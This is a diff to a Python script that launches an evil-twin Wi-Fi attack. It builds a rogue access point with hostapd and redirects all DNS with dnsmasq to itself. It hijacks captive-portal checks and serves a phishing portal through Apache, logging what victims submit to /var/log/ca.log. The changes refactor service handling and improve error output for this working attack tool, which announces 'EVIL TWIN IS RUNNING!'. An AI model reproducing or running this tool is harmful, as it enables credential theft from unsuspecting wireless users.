@@ -12,13 +12,14 @@ dnsmasq_proc = None
 hostapd_proc = None
 script_args = None
 
-def run_command(command, suppress_output=True):
+def run_command(command, suppress_output=True, ignore_errors=False):
     """
     Executes a shell command.
     
     Args:
         command (list): The command to execute as a list of strings.
         suppress_output (bool): If True, stdout and stderr will be hidden.
+        ignore_errors (bool): If True, will not print error messages on failure.
     
     Returns:
         bool: True for success, False for failure.
@@ -29,8 +30,9 @@ def run_command(command, suppress_output=True):
         subprocess.run(command, check=True, stdout=stdout, stderr=stderr)
         return True
     except (subprocess.CalledProcessError, FileNotFoundError) as e:
-        print(f"[-] Error executing command: {' '.join(command)}")
-        print(f"[-] Details: {e}")
+        if not ignore_errors:
+            print(f"[-] Error executing command: {' '.join(command)}")
+            print(f"[-] Details: {e}")
         return False
 
 def check_root():
@@ -46,7 +48,6 @@ def check_dependencies():
     print("[*] Checking for required packages...")
     missing = []
     for dep in dependencies:
-        # Use 'dpkg-query' for a more reliable check on Debian-based systems
         if subprocess.call(['dpkg-query', '-W', '-f=${Status}', dep], 
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
             missing.append(dep)
@@ -60,22 +61,12 @@ def check_dependencies():
         sys.exit(1)
     print("[+] All dependencies are installed.")
 
-def manage_network_manager(action='stop'):
-    """Stops or starts the NetworkManager service."""
-    service_cmd = ['systemctl', action, 'NetworkManager']
-    print(f"[*] Attempting to {action} NetworkManager...")
-    # We don't treat failure here as critical, as it might not be running
-    run_command(service_cmd)
-    print(f"[+] NetworkManager {action} command issued.")
-
-def manage_systemd_resolved(action='stop'):
-    """Stops or starts the systemd-resolved service to free up port 53."""
-    service_cmd = ['systemctl', action, 'systemd-resolved']
-    print(f"[*] Attempting to {action} systemd-resolved...")
-    # This is a critical step for dnsmasq to work
-    run_command(service_cmd)
-    print(f"[+] systemd-resolved {action} command issued.")
-
+def manage_service(service_name, action='stop'):
+    """Stops or starts a given service, ignoring errors if the service doesn't exist."""
+    service_cmd = ['systemctl', action, service_name]
+    print(f"[*] Attempting to {action} {service_name}...")
+    run_command(service_cmd, ignore_errors=True)
+    print(f"[+] {service_name} {action} command issued.")
 
 def toggle_ip_forwarding(enable=True):
     """Enables or disables IP forwarding."""
@@ -95,7 +86,6 @@ def configure_interface(iface, network_str):
     print(f"[*] Configuring interface {iface}...")
     try:
         network = ipaddress.ip_network(network_str)
-        # Use the first host address for the interface (e.g., 192.168.50.1)
         ip_addr = str(next(network.hosts()))
         
         commands = [
@@ -120,7 +110,6 @@ def create_dnsmasq_conf(iface, ip_addr, network_str):
     print("[*] Creating dnsmasq.conf...")
     try:
         network = ipaddress.ip_network(network_str)
-        # Define DHCP range (e.g., from .10 to .100)
         dhcp_start = str(network.network_address + 10)
         dhcp_end = str(network.network_address + 100)
         
@@ -129,14 +118,10 @@ interface={iface}
 bind-interfaces
 no-resolv
 log-queries
-
 dhcp-range={dhcp_start},{dhcp_end},12h
 dhcp-option=3,{ip_addr}
 dhcp-option=6,{ip_addr}
-
 address=/#/{ip_addr}
-
-# --- Captive Portal Redirection ---
 address=/captive.apple.com/{ip_addr}
 address=/www.msftconnecttest.com/{ip_addr}
 address=/connectivitycheck.gstatic.com/{ip_addr}
@@ -188,19 +173,15 @@ def setup_captive_portal_files():
     portal_dir = "/var/www/captive"
     print(f"[*] Setting up captive portal files in {portal_dir}...")
     
-    # Check for source files
     if not os.path.exists("index.html") or not os.path.exists("save.php"):
         print("[-] Error: 'index.html' and/or 'save.php' not found in the current directory.")
-        print("[-] Please place them alongside the script before running.")
         sys.exit(1)
         
-    # Create directory if it doesn't exist
     if not os.path.exists(portal_dir):
         print(f"[*] Directory {portal_dir} not found. Creating...")
         if not run_command(['mkdir', '-p', portal_dir]):
             sys.exit(1)
     
-    # Copy files
     try:
         print("[*] Copying portal files...")
         shutil.copy("index.html", os.path.join(portal_dir, "index.html"))
@@ -218,7 +199,6 @@ def setup_log_file():
         if not os.path.exists(log_file):
             run_command(['touch', log_file])
         
-        # Get uid and gid for www-data
         www_data_uid = int(subprocess.check_output(['id', '-u', 'www-data']).strip())
         www_data_gid = int(subprocess.check_output(['id', '-g', 'www-data']).strip())
         
@@ -234,28 +214,21 @@ def create_vhost():
     vhost_file = "/etc/apache2/sites-available/captive.conf"
     print(f"[*] Creating VirtualHost file: {vhost_file}...")
     
-    # Using a raw string (r"...") to prevent syntax warnings for '\.'
     vhost_content = r"""
 <VirtualHost *:80>
     ServerName captive.portal
     ServerAlias *
     DocumentRoot /var/www/captive
-
     <Directory /var/www/captive>
         AllowOverride All
         Require all granted
     </Directory>
- 
-    # --- Redirect known captive portal checks ---
     Alias /hotspot-detect.html /var/www/captive/index.html
     Alias /generate_204 /var/www/captive/index.html
     Alias /connecttest.txt /var/www/captive/index.html
-   
     RewriteEngine On
     RewriteCond %{REQUEST_URI} !^/save\.php$
     RewriteRule ^.*$ /index.html [L]
-
-    # --- Prevent caching ---
     Header always set Cache-Control "no-store, no-cache, must-revalidate, max-age=0"
     Header always set Pragma "no-cache"
     Header always set Expires "0"
@@ -294,7 +267,6 @@ def setup_iptables(iface):
     for cmd in commands:
         if not run_command(cmd):
             print("[-] Failed to set up iptables. Aborting.")
-            # Attempt to clean up before exiting
             cleanup(0, 0)
             sys.exit(1)
     print("[+] Iptables rules configured.")
@@ -304,32 +276,38 @@ def start_attack():
     global dnsmasq_proc, hostapd_proc
     print("[*] Starting the attack...")
     
-    # Ensure no other dnsmasq is running. Don't check for errors.
     subprocess.run(['pkill', 'dnsmasq'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     time.sleep(1)
     
     try:
         print("[*] Starting dnsmasq...")
-        dnsmasq_proc = subprocess.Popen(['dnsmasq', '-C', 'dnsmasq.conf'], 
-                                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        dnsmasq_proc = subprocess.Popen(['dnsmasq', '-C', 'dnsmasq.conf', '-d'], 
+                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         
         print("[*] Starting hostapd...")
         hostapd_proc = subprocess.Popen(['hostapd', 'hostapd.conf'], 
-                                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         
-        time.sleep(2) # Give processes a moment to start or fail
+        time.sleep(2)
         
         if dnsmasq_proc.poll() is not None:
-            raise Exception("dnsmasq failed to start. Check for conflicting services or configuration issues.")
+            stdout, stderr = dnsmasq_proc.communicate()
+            print("[-] dnsmasq failed to start. Error output:")
+            print(stderr.decode().strip())
+            raise Exception("dnsmasq failed.")
+
         if hostapd_proc.poll() is not None:
-            raise Exception("hostapd failed to start. Check if the wireless card supports AP mode.")
+            stdout, stderr = hostapd_proc.communicate()
+            print("[-] hostapd failed to start. Error output:")
+            print(stderr.decode().strip())
+            raise Exception("hostapd failed.")
             
         print("\n[+] EVIL TWIN IS RUNNING!")
         print(f"[+] SSID: {script_args.ssid} on Channel: {script_args.channel}")
         print("[+] Press CTRL+C to stop the attack and clean up.")
         
     except Exception as e:
-        print(f"[-] Failed to start attack processes: {e}")
+        print(f"[-] Failed to start attack processes.")
         cleanup(0, 0)
         sys.exit(1)
 
@@ -337,16 +315,14 @@ def cleanup(signum, frame):
     """Cleans up the system upon script termination."""
     print("\n\n[*] CTRL+C detected. Cleaning up...")
     
-    # --- Terminate processes ---
     if dnsmasq_proc:
         dnsmasq_proc.terminate()
         print("[*] Terminated dnsmasq.")
     if hostapd_proc:
         hostapd_proc.terminate()
         print("[*] Terminated hostapd.")
-    run_command(['pkill', 'dnsmasq']) # Just in case
+    run_command(['pkill', 'dnsmasq'], ignore_errors=True)
 
-    # --- Clean iptables ---
     if script_args:
         print("[*] Removing iptables rules...")
         rules = [
@@ -355,21 +331,17 @@ def cleanup(signum, frame):
             ['-t', 'nat', '-D', 'PREROUTING', '-i', script_args.iface, '-p', 'tcp', '--dport', '53', '-j', 'REDIRECT', '--to-ports', '53']
         ]
         for rule in rules:
-            run_command(['iptables'] + rule)
+            run_command(['iptables'] + rule, ignore_errors=True)
 
-    # --- Disable IP Forwarding ---
     toggle_ip_forwarding(enable=False)
 
-    # --- Flush interface ---
     if script_args:
         print(f"[*] Flushing IP from {script_args.iface}...")
-        run_command(['ip', 'addr', 'flush', 'dev', script_args.iface])
+        run_command(['ip', 'addr', 'flush', 'dev', script_args.iface], ignore_errors=True)
     
-    # --- Restart services ---
-    manage_systemd_resolved(action='start')
-    manage_network_manager(action='start')
+    manage_service('systemd-resolved', 'start')
+    manage_service('NetworkManager', 'start')
 
-    # --- Handle log file ---
     log_file = "/var/log/ca.log"
     if os.path.exists(log_file):
         print(f"[*] Displaying contents of {log_file}:")
@@ -388,22 +360,20 @@ def cleanup(signum, frame):
         print(f"[*] Removing {log_file}...")
         os.remove(log_file)
         
-    # --- Stop and clean Apache ---
     print("[*] Stopping Apache2 and cleaning configuration...")
-    run_command(['systemctl', 'stop', 'apache2'])
-    run_command(['a2dissite', 'captive.conf'])
-    run_command(['a2ensite', '000-default.conf'])
-    run_command(['systemctl', 'reload', 'apache2'])
+    run_command(['systemctl', 'stop', 'apache2'], ignore_errors=True)
+    run_command(['a2dissite', 'captive.conf'], ignore_errors=True)
+    run_command(['a2ensite', '000-default.conf'], ignore_errors=True)
+    run_command(['systemctl', 'start', 'apache2'], ignore_errors=True) # Start before reload
+    run_command(['systemctl', 'reload', 'apache2'], ignore_errors=True)
     if os.path.exists("/etc/apache2/sites-available/captive.conf"):
         os.remove("/etc/apache2/sites-available/captive.conf")
 
-    # --- Remove captive portal directory ---
     portal_dir = "/var/www/captive"
     if os.path.exists(portal_dir):
         print(f"[*] Removing directory {portal_dir}...")
         shutil.rmtree(portal_dir)
 
-    # --- Remove local config files ---
     if os.path.exists("dnsmasq.conf"):
         os.remove("dnsmasq.conf")
     if os.path.exists("hostapd.conf"):
@@ -423,17 +393,14 @@ def main():
     parser.add_argument('--network', required=True, help="Network address in CIDR format (e.g., 192.168.50.0/24)")
     script_args = parser.parse_args()
 
-    # --- Setup Phase ---
     check_root()
     check_dependencies()
     
-    # Register the cleanup function for SIGINT (Ctrl+C)
     signal.signal(signal.SIGINT, cleanup)
     
-    # Stop conflicting services
-    manage_network_manager(action='stop')
-    manage_systemd_resolved(action='stop')
-    time.sleep(1) # Give services time to stop properly
+    manage_service('NetworkManager', 'stop')
+    manage_service('systemd-resolved', 'stop')
+    time.sleep(1)
     
     ip_addr = configure_interface(script_args.iface, script_args.network)
     create_dnsmasq_conf(script_args.iface, ip_addr, script_args.network)
@@ -444,17 +411,14 @@ def main():
     create_vhost()
     enable_apache_site()
     
-    # --- Enable IP Forwarding before setting rules ---
     if not toggle_ip_forwarding(enable=True):
         cleanup(0, 0)
         sys.exit(1)
 
     setup_iptables(script_args.iface)
     
-    # --- Attack Phase ---
     start_attack()
     
-    # Keep the script running
     while True:
         time.sleep(1)
 
